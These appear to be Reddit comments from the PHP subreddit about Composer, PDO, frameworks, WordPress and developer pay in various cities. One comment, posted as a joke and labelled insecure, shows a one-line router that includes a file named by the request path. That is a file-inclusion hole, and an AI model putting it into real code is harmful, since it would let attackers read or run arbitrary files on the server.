This is good to know, thanks. I've seen composer just drag on and on sometimes though with large dependencies (Zend, for example)
You are kind of already doing it in your second example where you pass the $config array into the function. In this case, it means that the config is passed into a function from outside as opposed to a function pulling its config from the global namespace (via a singleton or whatever). It lets the caller of the function retain control over its config, which in general makes your code easier to test and maintain.
Aside from fun, it may lead us to more insight to writing shorter code. There's no code like *no code*! This has a pragmatic benefit, too, however: less code == less surface area for bugs.
http://grokbase.com/t/php/php-internals/13bng6yrcr/rfc-phpdbg#20131122vfec2100wd4y9q3qjqkxjk36tr
Every time I try to try out PHPStorm I just go back to Aptana :( I think it has something to do with the length of time that it takes to sftp a file to staging so that I can actually test it. (we use Drupal, so I can't exactly develop locally and I'm not setting it up because I have a week and 2 days left in this job) and I can't get past the "cheap" looking icons :( I've never had a single problem with Aptana in terms of "speed" like some people complain about. My only real complaint about it would be the syntax highlighting bug. Tis quite annoying. Please, somebody change my mind!!
http://grokbase.com/t/php/php-internals/13bng6yrcr/rfc-phpdbg#20131122vfec2100wd4y9q3qjqkxjk36tr
Are you already used to using php with SQL server(s)? What is your current experience level?
If you use `--prefer-dist`, it should cut down on the DL time for large packages like Zend. On some of my VMs, those packages just time out if I don't use that option.
Maybe this helps! [Create the instane..](http://www.php.net/manual/en/pdo.construct.php ) $dsn = 'mysql:dbname=database_name;host=127.0.0.1'; $user = 'database_user'; $password = '123456'; $db = new PDO($dsn, $user, $password); Now you can either be lazy and just go with [$db-&gt;query\(\);](http://www.php.net/manual/en/pdo.query.php) and do whatever you want, or be smart and go with [prepared statements](http://www.php.net/manual/en/pdo.prepare.php). $statement = $db-&gt;prepare('SELECT name, colour, calories FROM fruit WHERE calories &lt; ? AND colour = ?'); $statement-&gt;execute(array(150, 'red')); // $statement now contains the data (name column) where calories is 150 and colour is red $statement-&gt;execute(array(175, 'yellow')); // $statement now contains the data (name column) where calories is 175 and colour is yellow Familiar with sprintf and the like? The question mark is essentially the same as %s. So the values in the array inside execute is replacing the question marks and thus you get different results. Now you can use the $statement [to do as you like](http://www.php.net/manual/en/class.pdostatement.php).
28 and 0 now. Including Stas and Zeev. Wow.
You may wish to review [the highest voted StackOverflow questions about PDO](http://stackoverflow.com/questions/tagged/php+pdo?sort=votes&amp;pageSize=50).
The Jira and regexp plugins are nice and simple.
I use a file watcher with twitter's recess to compile my LESS into minified CSS. It works extremely well.
I found these articles really helpful, although I had to read them a few times and experiment a lot before I really grasped the idea. Getting my head around pdo also helped move me a step closer to understanding object oriented code a little better. Http://net.tutsplus.com/tutorials/php/why-you-should-be-using-phps-pdo-for-database-access/ Http://net.tutsplus.com/tutorials/php/php-database-access-are-you-doing-it-correctly/ Http://net.tutsplus.com/tutorials/php/pdo-vs-mysqli-which-should-you-use/
ExpressionEngine ; )
IIRC, using that option means composer will download a tar.gz (or some other archive) of the latest appropriate version of the library. This means it won't clone the library's repository. So the next time you do a composer update, it will have to download the whole library again. Compare this with not using this option, composer will clone the repository for that library so that next time you issue a composer update, it's just doing a git fetch and checking out the relevant commit/tag for that library (which is usually much quicker than having to download the whole library as a tarball again and again). tldr: --prefer-dist is faster on the first install/update, but subsequent operations will be slower
i agree that 39 elance developers is a bad choice. but i think 100 an hr seems more than reasonable. im a php developer of decent skill and i can't even imagine that hourly. 
This one has helped me: http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers
Just make it a global and stop making yourself insane. There are tons of possible ways to do this, but all of them are basically global somethings, global functions, classes, whatever. They give no benefit over an actual global. If you think someone else might ever need to interface with your PHP code you may want to namespace all of your code, but that's it. (And even then you can just add it when you need it.) The thing is, people advise against globals for a good reason: They can make your code hard to understand and modify. But don't take that advice too far: There are still cases where you do need and should use a global. Some people think that since "some globals are bad, all globals are bad", which is obviously bad logic.
Thank you for your kind words. This is exactly my point - are the PHP and JS frameworks missing the point which is there should be a product category called LAMP framework encompassing both front-end and back-end systems albeit combining several language components (php, html, css, javascript, etc). As we go forward more people will see that PHP is now mainly a good quality, highly competent, object-orientated back-end language. Technical architects who understand good separation of concerns should recognize this and PHP mostly away from the front-end. In this scenario PHP starts replacing Java in non-Oracle shops. The front-end may be pure HTML/JS/jQuery or a framework like Angular or Ember but we should be passing messages back and forth between the 2 systems (the view/controller and model/controller). The only PHP in the front-end should be the bootstrap (initial load code to process config files, setup sessions and check ACLs etc.). It just seems silly to me that there is so much on here about this framework and that framework but not too much about how to really implement large modern web applications (or rich internet applications) which (in my opinion) is where the big $$ is in PHP development. 
Great presentantion. Congrats!
Interesting side note but I am not sure I agree. i do agree HTML is used for content and CSS to implement a design (look and feel) but arguably the design itself is entirely separate and encompasses mock-ups, Photoshop PSDs, UX-flow diagrams etc. Related to this I love the csszengarden site, which shows how exactly the same HTML can be made to look so different just using different CSS content: Link: - http://www.csszengarden.com/ 
It's called code golf. http://codegolf.stackexchange.com/questions/5600/print-the-alphabet-without-using-each-vowel
Frameworks make this a million times easier. In the case of Laravel, dare I say... fun? If you're in any position where you're about to go in and refactor a bunch of old code to PDO, or especially if you're starting a new project, I would highly recommend giving Laravel (or another great framework) a shot. The time you would spend on replacing all your old db calls is better invested in doing the framework thing. You'll thank yourself later.
I might agree with you if it weren't for the fact that this reddit does it every other week. Exactly how many conversations about editors are required before the subject is adequately covered? They really haven't evolved as much as people think they have. In fact, PHP-specific editors/IDEs have been playing catching up for the last decade more than anything. Even now they pale in comparison to tools available for other languages. Seriously guys, editor macros are not a new or exciting concept.
If you are interesting in doing this seriously you should read this by [one of] the authors of PHP: http://toys.lerdorf.com/archives/38-The-no-framework-PHP-MVC-framework.html Some (many) MVC frameworks are FAR too complex.
Can't recommend London enough. Contracting as an MVC PHP dev can get you £350 ($650 USD) per day, more if you're well proven. I've been here just over a year - I started on a 1 month contract which has been extended for 11 months now. Not to mention Europe is amazing in general.
I cannot use projects requiring Composer. Because I don't have administrative rights neither on the shared hosting nor in the computer I use. The reason why I choose PHP is that it works everywhere same and it does not require to install software to the computers I use. However when it comes to PHP projects with Composer, most of them do not provide the normal installation procedures. I don't understand what is so hard to just put a config file where I can point the location of dependent file.
yep, pretty much. Objects set to session will get serialized. Think of the implications (or better yet - test it)
1. PDO is very simple. Forget frameworks until you can do basic PDO. 2. Best tutorial (imo) if you know mysql_xxx: http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers 3. Most frameworks use ORM on top of PDO and SQL - learn the PDO and SQL first. You must know SQL to be a back-end developer. No ifs and buts. 4. No other way - just use PDO with prepared statements and bind the variables. Lots on google about this. Google is your friend here. There are lots of sites offering help and examples using PDO to read and write data from mysql databases. 
London +1
£91,000 after tax is thirteen pounds and seven pence. 
I'm confused. You say you're not sure you agree, but then you reiterate my point..?
Why would you need admin rights to use Composer? The point of it is that it can be used *per project*. There's nothing saying you can't have the Composer executable inside your project's directory and run it from there.
Of course he isn't. Butas his reputation is strong enough to command those kinds of prices, he does.
It's not too boring! Most of my files don't contain only php (yet! I'm starting to work with CodeIgniter and my next job will be using Laravel so I'm excited to get back into MVC frameworks). Within the last 24 hours I've learned you can actually create OO PHP that looks a lot like Java/C++ and that makes me very happy. Right now I work mainly on drupal projects, and I'm actually just finishing up one here because I only have 8 days left at this job, but I still want to improve my code!
Another +1 for London. So many jobs.
How did you find your current contract, was it personal referral, recruiters, advertised online?
That's a very nice and succinct description.
Laravel is an exceptional step forward. I would recommend using it instead of CodeIgniter for pretty much anything and everything. People can certainly do nice OOP in PHP, but unfortunately many people lack the knowledge, and convince themselves and others that it's PHP at fault, not themselves. There's a lot to learn, but a willingness to do so is a very good thing.
How much is an approximate living cost in London? I'm aware that you more than cover it with that salary, just asking to see if there is any correlation. What do you mean by "well proven"? Do you have a college diploma in something? Experience? Or maybe both?
While ignoring the fact that I think this whole thing is a bad idea, it's generally accepted by most if not all standards that each class has its own file and each file has only one class. This makes things like autoloading and namespacing a lot easier to work with, as well as management in general.
I didn't say you couldn't use xdebug to debug the CLI. :) The reason for explaining SAPI v extension is because the tools are so similar, except for the main difference of SAPI v extension. So, why not explain that? XDebug does its work by hacking into existing SAPIs, PHPDBG provides a dedicated SAPI for debugging which is part of the core. So, putting a tool that does relatively similar jobs to xdebug but _in the core_ means that everyone can utilize it, not just those that install xdebug. If you consider xdebug to be a better choice then continue to use it, but many consider other tools to be better at the same job, so xdebug is not the only option. As an extension it would also make for a poor candidate to roll into the core. 
Sent a few copies of my CV via cwjobs.co.uk - once you're on some recruiters lists you get bombarded with interviews. I think the one I got wasn't advertised online but that's where the recruiter found me to start with :)
Yeah. I just started brushing the surface with Codeigniter for some personal projects and then I got an offer for my new job where I'll be using Laravel, so I'm going to try to make a switch to Laravel for my personal projects now. I started with php about 10 years ago, but I was learning everything on my own from web tutorials. It wasn't until about 2 years ago where I finally went to college and took some entry-level programming courses where I learned things like Data Structures, and encapsulation. Having just taught myself procedural programming, the whole concept of OOP was new to me. Here I am now, though, with a basic understanding of many languages (PHP, Perl, Python, Java, C, C#) and programming concepts, but I just want to keep learning.
I have no formal training, but I've been working commercially for agencies and development houses for almost 7 years now. Well proven would be a combination of good references, code samples &amp; work experience. Cost of living can vary, you can get a room in a flat (sharing with 3-4 other people) not far from the center of town for £550 p/month including bills. However you can easily spend £2,000 p/month to live in a nice house &amp; area. Food is probably the cheapest thing (compared to New Zealand where I came from) and rent is the heavy hitter. If you can get a £35k+ salary you can live very comfortably here.
I never thought anyone would get offended by that, really. I mean she is based on Tinkerbell, do you find her cartoons offensive too? E.g. http://owoll.com/wp-content/uploads/2013/12/Free-Wallpaper-Tinkerbell-Friends.jpg
Markham/Richmond Hill, Ontario!
Believe it or not - Las Vegas Vegas has an interesting mix of web companies right now from casino companies setting up poker websites to companies like Zappos doing retail. There are a number of jobs in web development here right now and a lot of room to grow. 
Even though you don't get admin rights on shared hosting, a lot of them still provide SSH. Besides that I would simply say: run it in your dev environment (most probably locally) and then just copy the entire directory up via FTP to deploy? 
I live in New York. I updated my resume on dice a week ago and have received no fewer than ten phone calls a day, all with different companies.
We use CI at work, and although many think it is dead, we just build internal improvements on it. It does everything we need it to, and when it doesn't I extend it to make it better. Just cause the community isn't working much on it, doesn't mean it can't be improved yourself. And although it's "old" it does heaps "right"; and even if it did it "wrong" in your opinion, it works for every situation our company has come across, and I extend it where it's needed. Don't need another company holding my hand to make something better. CI is so simple in it's implementation it never breaks (in our use), and I personally think most other frameworks are just too bloated; but doesn't mean they don't work. CI also deals with the loading and hidden implementation of a singleton, very well, which is exactly what the OP has asked about.
http://philsturgeon.co.uk/blog/2009/12/Twiny-Framework-the-framework-small-enough-to-tweet
&gt; dumping arrays into &lt;pre&gt; tags This has nothing to do with global vars, but please learn to use [error_log()](http://php.net/manual/en/function.error-log.php). In short, calling `error_log(print_r($var, 1))` will put the output into the file defined by `error_log` in your php.ini. Why? * since it's a text file, it doesn't require you to preserve the format of data using &lt;pre&gt; or similar * it's not visible to users, which means: * it won't mess up your layout * it's no longer a security concern (e.g. you won't accidentally divulge your DB credentials to users) * it can be left in-place when the site is live and nobody is the wiser * the log file is only cleared when you clear it manually, so you can run your code, change something, run it again, and then compare the 2 log entries side-by-side
I'm out of Atlanta. We have a ton of agencies here in the city, and thus a lot of freelance work. That being said, I recently stopped freelancing and assumed a job at an agency. From my experience, $60k - $70k a year is about the limit. Just based on job searches and offers.
You could look into BlueImp File Upload (https://github.com/blueimp/jQuery-File-Upload) - Should do everything you're needing + instant uploading and such.
Well, I can always get a more neutral image of course, Idk, perhaps a silhouette. Do you like this one better: http://fc00.deviantart.net/fs70/f/2012/362/1/8/phpixie_by_misteraibo-d5pf97q.png
and yet i'm here stuck earning $14k a year 
Many thanks!
It's one thing to not have rights to SSH on the shared server... It's another issue to have neutered rights to the machine you're developing on. This is not an ideal development environment. You should be able to (worst case scenario) do all of your composer work on your machine and then push the code up to the shared hosting and/or testing environment (if applicable). These days, even shared hosting offer SSH. You sometimes have to ask permission or set it up via whatever control panel is available to you.
Wow, I didn't even know that function existed, and I look at my php error log all the time when I get just a blank page because errors don't output by default. Thanks!
&gt; ... the Aura.Web_Project package is a minimalist web-specific project framework that starts out small and grows only as you need it. &gt; &gt; By “minimal” we mean very minimal. The project package provides only a dependency injection container, a configuration system, a router, a dispatcher, a pair of request and response objects, and a Monolog instance for logging. &gt; &gt; This minimal implementation should not be taken as “restrictive”: &gt; &gt; - The DI container, coupled with the project kernel’s two-stage configuration, allows a wide range of programmatic service definitions. This means no more static calls to configure services; edit the modify stage config files, pull a service out of the container, and operate on it directly. &gt; &gt; - You can add any library you want into the project, not just Aura libraries, through Composer and the DI container. This means the bundle/plugin universe is made up of anything written in PHP, not just Aura-specific plugins. &gt; &gt; - As noted in earlier articles in this series, the router and dispatcher are completely separated from each other, and are built with iterative refactoring in mind. This means you can start with micro-framework-like closure controllers, and work your way into more complex controller objects of your own design. 
holy shit comic sans...
I can't find the repository for the documentation site, so I'm not sure where to mention this or if there's a reason behind the decision, but the new documentation switching system is sort of broken. If I click this submissions link it redirects me to the documentation homepage because I was looking at the 4.0 documentation earlier, so I can't access the releases page unless I switch back to 4.1 -- which isn't obvious at first. Any way to link to version specific documentation? 
But with now much experience are you talking? I code as hobby, nothing to do with my job. I currently earn a decent wage doing something I don't enjoy that much. I'm decent at coding (PHP, JS, bit of node etc), but obviously a lot to improve on and have been using Laravel for a fair while now as a MVC framework. The issue I find is that unless you have experience of loads of coding languages with 10 years experience, you're lucky if you can get a job that isn't a "junior developer". It's good money for sure, but imo you have to have gone through the shit not earning that much to get there. Could be wrong, but that's what I've found.
Or it doesn't, which is when you **do not** use it. Also, I hope that people will notice that there **is** "`AND`" in the comment above and **not** "`OR`".
Look into Frameworks, I learn the most from those codebases as they are the most extensive in their usage of phps features. Alot of the people writing the popular frameworks can make this per hr doing consulting work for big companies on critical projects.
Berlin, Munich, and Hamburg are hot spots for IT specialists here in Germany. Especially Berlin, with its large number of startups, has a very large job market for web developers. If you additionally have CMS development skills for Drupal, Typo3, WBB, or phpBB, you're as good as hired. If you're good, you can easily earn &gt;70,000€/year.
Use something like [Tag-It](https://github.com/aehlke/tag-it). It will make entering tags easier and reduce incorrectly spelled words/tags when uploading. It will also allow for your tag search functionality. The important thing about a system like this is to ensure that your users have visual feedback regarding whether or not the tag they're typing in already exists.
This is exactly what I would have written. :)
How exactly is this "lighter" than Silex? You say: &gt; By “minimal” we mean very minimal. The project package provides only a dependency injection container, a configuration system, a router, a dispatcher, a pair of request and response objects, and a Monolog instance for logging. Silex has a quite similar setup: &gt;So first of all, how many dependencies does silex have? As of right now, 7. &gt; Here they are, in all of their glory: &gt; &gt; pimple/pimple &gt; psr/log &gt; symfony/debug &gt; symfony/event-dispatcher &gt; symfony/http-kernel &gt; symfony/http-foundation &gt; symfony/routing 
First thing that caught my eye.
Thank you, I will look into this.
Do you have any recommendations on how to get started in London? Any good websites that have ads? 
Why yet another micro framework? Silex is so light, I can't understand why more would be better
I've actually never used jquery. I can see how using tagit would make entering the tags better. But I don't understand how I could use it to search for multiple tags. The issue I am having is in the backend with searching the database for the tags entered 
I take it you're not European then? Did the job cover your visa, or otherwise help you immigrate?
Yeah I plan to fix that issue. Thanks.
Getting a lot more feedback now to the list. Thanks to everyone who frequents this subreddit for the suggestions you have made. Much appreciated by us. We're still running this as a voluntary team but welcome any help and suggestions as ever :) Ade
Great question! To compare, let's follow the Silex "via Composer" installation instruction at http://silex.sensiolabs.org/download . After creating a directory and adding a `composer.json` file, we do the install, then run `du` to see disk usage: ronin:silex pmjones$ composer install ... ronin:silex pmjones$ du -h . ... 3.6M . So, the bare-bones Silex install, without even any skeleton files, is about 3.6M. Let's install Aura.Web_Project and see how it compares. ronin:~ pmjones$ composer create-project aura/web-project --stability=dev ... ronin:~ pmjones$ cd web-project/ ronin:web-project pmjones$ du -h . ... 5.1M . Uh oh -- how can that be? I *know* that the total file size is smaller than that. It turns out that Composer did not delete the .git directories of the vendor packages, even though I answered "Y" to "Do you want to remove the existing VCS (.git, .svn..) history? [Y,n]?" That option appears to apply only to the top-level project being installed, not to the vendor packages. To make sure you don't get VCS files in the vendor packages, you need to use `--prefer-dist`. So, let's try it again, using `--prefer-dist` to make sure the `.git` files are not included: ronin:~ pmjones$ composer create-project aura/web-project --stability=dev --prefer-dist ... ronin:~ pmjones$ cd web-project/ ronin:web-project pmjones$ du -h . ... 1.8M . That's more like it. `Aura.Web_Project` is 1.8M, and that's *with* the skeleton files, almost literally half the size of Silex. (And no, the Silex files do not include .git files or anything like that. ;-)
Why does the directory size matter?
It doesn't matter. If the difference between the two packages was something like 20M, then yeah, that would be a concern. But a couple megs? That is a completely useless metric.
I use Wordpress on the backend of my web application just for the sole purpose of having plugins and a solid framework that is easily documented. Although my site is not a blog it still ties into the Wordpress functions which gave me all the flexibility I wanted. I have not worked with other backends. Look at my site a www.procomport.com it is as far from a blog as you can get but it works. Wordpress doesn't only have to be used for a blog you can strip all the unnecessary code and make it do what you want it to do. Think of it like Pimp My Ride but with Wordpress.
My bet is that if Silex were to come out with a second version at half the size, they'd advertise "Now at half the size!"
Not as light at Aura.Web_Project, apparently. ;-)
I use 'PC laboratory' computers in a university where there is no administrative rights for users. The ones that offer SSH are expensive.
I use 'PC laboratory' computers in a university where there is no administrative rights for users. The ones that offer SSH are expensive.
Will we get a link to this every week? Seriously that's getting annoying, what's the point to linking to links in a link aggregator? Just post those links here already.
I live in Lyon, France and, though I wouldn't expect that, there are a lot of PHP job offers and PHP companies here. I wonder if that's the same elsewhere in france.
I have this plugin called S2 member which is a paid membership plugin. I bought it because learning the Paypal API is entirely too hard. Whenever there is a plugin to do something im too lazy to make myself there is usually already a plugin made for it.
Well, now you mention it.... Pimple 2.0 (and therefore Silex 2.0) will be significantly faster - https://github.com/fabpot/Pimple/pull/92. Also, Sensio are working on a Pimple2.0 C extension, which will be even faster, though it's not quite stable enough for public consumption yet.
You like what you like, others like what others like.
Solar was faster than Symfony 1, and the Symfony crowd said "Speed doesn't matter!" (even though they claimed to be "fast" at the time). So it seems like Symfony devotees are never really satisfied.
Then that's when you program it yourself. If you're using Wordpress for base functionality then it should only be a blog then.
Wordpress is a very quick and easy way to get certain types of functionality quickly. Like... a blog, for example. Wordpress can also be used to manage certain types of content very well, for example events, articles, or even products. The further you get away from that core capability the more you need to customise and the more difficult it will be to force Wordpress to do things. Furthermore, and this will start some fights, but let's jump into it: Wordpress is fucking shit. It's a terrible piece of software that allows you to create godawful results. It is utterly untestable, architecturally disgraceful, woefully out of date with any notion of best-practises... If you make a web app with Wordpress it may well suit your needs, at least initially. But it will be, objectively, factually, a complete and utter shitstain. http://www.belessbad.com/post/why-wordpress-hurts-us-all
&gt; That said, I would NOT say WP is a terrible piece of software... Sorry, but it is. It's shit. It's untestable. It's inconsistent. It utterly violates a wide range of established software development and web rules. By any objective standards it is terrible. I'm not saying it can't occasionally be a useful tool. Even knowing how fucking horrible it is, I've still used it occasionally. But it's fucking shit and we should all stop defending it.
Twin Cities dev here. $40-$100k is a more accurate range. Many places gladly take people in at $40-$50k (sickening). It's not hard to get $60-80k if you have some confidence in your skills. Contracting is an easy way into $80-$100k. Currently doing a front end (sadly little-to-no PHP) contract at $80k (technically $40/hour). PHP / LAMP contracts go higher. At least here in the TC you can easily contract with no downtime between contracts.
I followed the instructions there and am getting this error when I do "composer update"... #!/usr/bin/env php {"error":{"type":"Symfony\\Component\\Debug\\Exception\\FatalErrorException","message":"Class 'Illuminate\\Foundation\\Providers\\ConsoleSupportServiceProvider' not found","file":"\/home\/dev2\/vendor\/laravel\/framework\/src\/Illuminate\/Foundation\/ProviderRepository.php","line":123}}Script php artisan clear-compiled handling the pre-update-cmd event returned with an error Thoughts? It apparently has something to do with the artisan "pre-update-cmd" trying to run, but I don't think that works after making the changes listed in the upgrade guide because Laravel now can't run until after it's upgraded to 4.1.
You want to brand. . .a function?
 &lt;?include($_SERVER['PATH_INFO']); Not very secure[1]. And in reality violates the spirit of the exercise... but it **is** a *really* short router! [1] Yes, that's a joke.
The F
Oh, I don't take things like this personally. "Lighter than Silex" is not that bold, really; I backed it up with numbers. If someone feels that making a measurement is an attack, well, I can't help that. I agree that "lighter" can be measured in the ways you note: - We can see from the above that "less kilobytes" turns out to be true in the case of Aura.Web_Project. - My guess, although I have not measured, is that "less lines of code" is also true, but that's a little more difficult, as we'd probably want to measure "non-comment non-whitespace" lines of code. - "Faster execution time" is also measurable, and I plan on doing that now that both you and mnapoli have mentioned it. I have a history of doing that kind of thing, after all. ;-) On the other hand, "Less stuff to learn" and "easy to learn, easy to use" are much harder to measure, since you can't control for the learner very well. So as a *measure* it's not that great.
Try running composer update --no-scripts.
One needs to be careful about estimating end-to-end responsiveness based on a single component. It *might* be true that a significantly faster Pimple will result in a significantly faster Silex, but it depends on how often Pimple actually gets called in the system. If it only gets called, say, in 5% of the calls throughout Silex, then that 5% will be faster, but the rest will be the same speed.
&gt; On the other hand, "Less stuff to learn" and "easy to learn, easy to use" are much harder to measure, since you can't control for the learner very well. So as a measure it's not that great. It is very hard to measure, but this is so much more important than "how many times per second" an app can poop out "hello world". :-) And I politely disagree on the fact that you can't control that. You can, by having rock-solid documentation. 
The hard part is getting people to give you the chance. If you don't have the educational merits then you really have to prove you can get the work done to a good standard. I was very fortunate to have been a founder for a successful company at home which I think is what got me in the door for most of my interviews moving here. If you can show you can do the work required, why wouldn't they hire you? I say this however I've only worked with small agile teams in my career and I'm sure a more corporate environment would be different.
I came here on a 2 year work visa and am extending via a sponsored work visa, hopefully anyway :p
http://cwjobs.co.uk is good for technical roles And http://reed.co.uk for a few more corporate roles
I love the fact that Aura is almost half the size of Silex. It really makes a difference. Now back to 2013 Seriously though, the framework seems interesting. But if you advertise "lighter than silex" as one of your main *selling* points and it turns out it's just a megabyte less in size compared to a 3mb framework... which today is probably a fraction of a cent... it's not really appalling. If you, on the other hand, meant "lighter" as in less memory footprint, or faster execution... that would be another thing
I mean "control" in an experimental sense. Someone who "gets" how the system works, and how the application being built is supposed to work, or someone who has more experience with the particular system and application domain, is going to feel "more productive" than someone who does not/is not. Documentation can only go so far on that.
Also, on "pooping out" hello world (nice!), that's the measure of *the overhead of the framework overhead*, not any special business logic attached to the framework. Does it measure how fast applications written in that framework will perform? Not necessarily. Does it tell you the upper limit of responsiveness of that framework? Yes.
Only for generating the Bloom filter in PHP if you're running while ensuring the index is unique. The filter only grows with unique input, but the getErrorRate() that estimates the rate of false positive expects the $elementCount to be accurate. So if different password lists contain duplicates between them it won't be accurate, and the probability will be biased. A solution to this would be to check hashes before inserting them into the bloom filter, which is also slow. The memory limit and default settings are only needed if making a bloom filter that contains ~8 million passwords.
Yeah if we're talking contracts, you can obviously go higher. I had several offers in the $40 to $50/hour range. I still get messages from recruiters pretty much every day. IT unemployment is amazingly low here, definitely a high demand for devs. I have a lot of front-end experience as well, and that seems to be just as much in demand as PHP if not more.
calling wordpress a framework is an insult to frameworks. i'd call wordpress a monkey-patched conglomeration of everything you should never do with php.
Ctrl+F12 to jump to a method/variable in the current file/class! :-) 
Thanks, but I still have no clue what a bloom filter is, or what problem it solves.
See my other comment in this post, but yes - this should be possivble in the 7.1 EAP using surround with emmet.
I assume it is the claims that Paul makes that causes all of the hate here, his code and contributions are definitely on the higher end of the spectrum. I swear it sounds like r/php is full of geniuses every time I read a post about Aura, to those people, where are all of your contributions that make you so superior?
oh my god if only this was alphabetized like netbeans... but still, good enough!
Not like a brand... Right now I just call generateForm($args), and I'd like something less generic when I explain its capabilities to my co workers. 
Wow you got out of your house. Congrats? If I wrote a blog post for every meetup/conference I attended and posted it here I'd be a spammer.
Thaaaaank you. I will try that immediately. I'm already on 7.1 EAP so this should be easy.
You see, I know Paul is a very capable developer. But he is presenting a microframework that will, by its nature, compete with silex. I want to know why should I use Aura instead of Silex. Disk size isn't ~~want~~ one of the reasons I care about.
In this case it lets you reduce a password list of millions taking up megabytes of data into an index of a few kilobytes. You could include this on a page as given to the client to avoid sending the plaintext passwords over the wire, since they can test if it's a bad password by inspecting the bloom filter - but the bloom filter contains no passwords in it directly.
You really need to get out more.
You mean, a 'project name' of sorts? For example, Codeigniter? FireForm, IceForm, FormMaestro... you get the picture.
Nightmare, Zalgo, AbandonAllHope, these are good suggestions.
It's a curated list that is non-spammy and imho provides some value. It's very much PHP-related. I see no problem with it.
One of the production servers is a virtual one. I made a clone out of it tonight so I can use it as my sandbox for the upgrade. I assume there will be IPs/hostnames that reflect the original server which will need to be changed. Also, do you recommend first going from 5.2 to 5.3 and then finally to 5.4? Or it is safe to jump straight to 5.4 when it comes to installing the upgrades?
Find a remote job, move to Bumfuck, NE, and work your ass off for 10 years. Retire at age 35.
How hard was it to get a working visa? I see you're from NZ .. I'm an Aussie so I assume it would be somewhat similar process.
Cool. I did not try the swap files. I'll certainly keep that in mind too.
FormIgniter?
Totally agree. Wordpress is designed to sell blog themes, plain and simple. Anyone's rationalization for it being MVC are all ridiculous to listen to. It is meant to be a blogging platform. It has many themes and can be deployed easily on a lot of bargain hosts. Every audit I've done of a site that uses Wordpress but claims to go beyond basic blogging has shown me that it would have been easier to just write it as a basic PHP application. 
I always figure that in the open source world, developers are forced to do some things they aren't good at. A great coder might be terrible at coming up with a memorable name. Doing so (creating a new project) is a part of the PHP community as a whole. Not a technical part, but still a part of it. The more general topic of coming up with good names for code (from variables on up to projects) *is* part of coding. Helping this person with it is the same as helping them with any other part of PHP coding. There's no PSR for project naming. Yet.
Does godaddy have free hosting for it? How do I go about option one
I don't know what you just said at all besides godaddy. I guess I'll just do that... unless there's a free way to do it. Because I don't have a godaddy url for the site I wanna add php too
You are probably looking for in_array()
I quite enjoy these kinds of tutorials, thank you for sharing!
You're welcome. :)
Maybe array_intersect()?
If you want to test the code locally on your machine you could use something like MAMP (for Macs) or xampp/wampserver. (for Windows) They set up a local Apache/PHP/MySQL setup with everything wired up for easy use. The other suggestions are good if you want to put it online so others can see it.
Thank you. Ive never used apache nor do i know MySQL yet. But Ill try to figure it out. If I have anymore questions ill let you know
+1 for San Francisco, especially if you've got some experience. It's a great market for tech talent here and has been for a number of years. The culture is also hard to beat, especially if you're at the pre-family stage of life. I used to live in DC for a while, and while there are lots of jobs there, they (in my small sample size of experience) were often either government contractor jobs or agency jobs with limited growth potential. Instead of building the next big thing people seemed more focused on credentialism.
where's "here"?
^ good sound advice ... 5.4 is new enough to support opcache/zend optimizer, you should certainly test the new environment using opcache if you were using apc's opcode cache before; o+ is very nearly magical ...
Having just wrapped up a night of freelance work on a wordpress e-commerce site... Wordpress sucks. Don't use it for anything that it doesn't already do if you don't have to. It's not immediately obvious from looking at the front end of WP sites how bad the code base really is. Wordpress is becoming more and more outdated by the day, but it has a huge user base that keeps pumping out plugins and freemium themes. It sounds like you're aiming for something more in the webapp arena, and for that you're going to want an MVC framework. Laravel is a good choice. User authentication and sign ups are easy enough and payment gateways with subscriptions (recurring payments) aren't a huge hurdle, although they're not much fun to set up. The Laravel community is pretty large as well, you'll be able to find a lot of libraries and packages to get you started there. 
I just ran a full composer install; composer update; to get it working :) 
&gt; Furthermore, and this will start some fights, but let's jump into it: &gt; &gt; Wordpress is fucking shit. It's a terrible piece of software that allows you to create godawful results. It is utterly untestable, architecturally disgraceful, woefully out of date with any notion of best-practises... I hope this doesn't start any fights. The Wordpress code base reeks of shit. I had to do a modified version of [this](https://codex.wordpress.org/Making_Advanced_Taxonomy_Queries#Examples) on a project awhile back, joining the Wordpress postmeta table to itself six times in a query to get all the related data I needed. It makes no sense to set up a database that way. 
It's not really the front end that's the problem. It's the mangled back end, lack of organization, overly flexible (read: inefficient) database design, and crazy "every object is a post" architecture that will cripple your app. Note that /u/sirricharic has a content-centric site with lots of content divided into categories for easy browsing. That's what WP can do without a huge struggle. For a webapp it'll be more than in your way. 
If I understand your question correctly, you want a user to be able to enter a search term that has multiple tags in it, and then have your query return results that pertain to either tag. A very basic way to do this would be to take the user input and explode on " " and then search for a tag that contains any of the resulting pieces. Assuming you're storing tags for an upload in a single text/varchar field you would just set up a query like: SELECT * FROM my_table WHERE tags LIKE '%search_part_one%' OR tags LIKE '%search_part_two%' ... etc Also, since you said this is your first project... make sure you're using PDO instead of mysql or mysqli and use prepared statements. Don't trust user input to be safe.
Well, there might be ... we do update it, I (re) done some of it not long ago ... It's not likely to ever be "complete", just as a living autobiography cannot ever be completed; there will always be another section that "we could do with".
`$this-&gt;connect` is not the same as `$this-&gt;connect()`, Laravel uses magic methods a lot to make things easier for developers using it. `$this-&gt;connect()` refers to a class method, so if you have no method called `connect()` PHP will throw an error. `$this-&gt;connect` refers to a class property. So $this-&gt;connect-&gt;isConnected(); Would be correct. If you are adding brackets then it indicates a function/method. You should research some more on PHP OO &amp; Magic Methods. &gt; What options do we have in PHP to create objects differently than the examples below? How about creating the class yourself the standard way? class Redditor { public $username; public $karma; } Most of the time, objects generated on the fly are for database records &amp; data from an external service. Other than that they are not used much as concrete classes are better 99% of the time.
Do we really need an upgrade guide? I thought the whole point of using Composer was the benefit of doing quick, painless upgrades. That list contains a lot of tinkering. 
i love to use wordpress for managing content JUST For content i dont use their user/acl, etc, when we syndicate wordpress we always use it only for managing content/articles. thats its key asset and thats what it can do perfectly. so whenever theres payment &amp; accouting involved i'd highly vouch to starting off a inventory/shop software like magento - not wordpress.
Yes, true :) as long as you don't try to squeeze all the plants from the large garden into the small garden. Then you'll have just as many bugs. I'm see the metaphor works on some level there. 
